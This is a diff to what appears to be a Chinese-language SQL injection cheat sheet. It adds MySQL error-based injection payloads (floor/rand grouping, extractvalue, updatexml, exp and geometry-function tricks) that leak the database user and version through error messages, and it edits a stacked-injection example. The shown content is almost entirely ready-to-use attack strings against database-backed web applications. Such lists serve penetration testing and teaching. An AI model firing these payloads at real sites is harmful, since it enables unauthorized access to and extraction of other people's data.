@@ -39,10 +39,22 @@ Fuzz注入点
 报错注入
 --------------------------------------
 - ``select 1/0``
+- ``select 1 from  (select count(*),concat(version(),floor(rand(0)*2))x from  information_schema.tables group by x)a``
+- ``extractvalue(1, concat(0x5c,(select user())))``
+- ``updatexml(0x3a,concat(1,(select user())),1)``
+- ``exp(~(SELECT * from(select user())a))``
+- ``GeometryCollection((select * from (select * from(select user())a)b))``
+- ``polygon((select * from(select * from(select user())a)b))``
+- ``multipoint((select * from(select * from(select user())a)b))``
+- ``multilinestring((select * from(select * from(select user())a)b))``
+- ``LINESTRING((select * from(select * from(select user())a)b))``
+- ``multipolygon((select * from(select * from(select user())a)b))``
+- ``ST_LatFromGeoHash((select * from(select * from(select user())a)b))``
+- ``GTID_SUBSET(version(), 1)``
 
 堆叠注入
 --------------------------------------
-- ``;and 1=1``
+- ``;select 1``
 
 注释符
 --------------------------------------
